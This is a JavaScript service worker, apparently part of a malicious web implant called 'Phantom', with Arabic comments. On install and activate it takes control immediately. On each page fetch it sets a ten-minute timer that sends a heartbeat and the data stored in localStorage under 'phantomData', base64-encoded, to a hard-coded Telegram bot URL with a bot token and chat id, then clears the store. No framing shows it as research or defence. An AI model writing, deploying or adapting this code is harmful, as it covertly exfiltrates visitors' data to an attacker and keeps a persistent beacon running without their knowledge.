javascript


self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(self.clients.claim());
});

function sendToServer(data, priority) {
    const webhook = "https://api.telegram.org/bot8073495977:AAECigYhnK8lw6xWwVZgWbmGuEIDRor4GO4/sendMessage?chat_id=5111521886&text=";
    const encrypted = btoa(data);
    fetch(webhook + encodeURIComponent(`[${priority}] ${encrypted}`), { mode: 'no-cors' });
}

// إرسال البيانات المخزنة من Web Storage
function sendStoredData() {
    const stored = JSON.parse(localStorage.getItem('phantomData') || '[]');
    stored.forEach(item => {
        sendToServer(item.data, item.priority);
    });
    localStorage.setItem('phantomData', '[]'); // مسح بعد الإرسال
}

self.addEventListener('fetch', (event) => {
    event.respondWith(fetch(event.request).then(response => {
        setInterval(() => {
            sendToServer("Phantom still active", "LOW");
            sendStoredData(); // إرسال البيانات المخزنة
        }, 600000); // كل 10 دقائق
        return response;
    }));
});
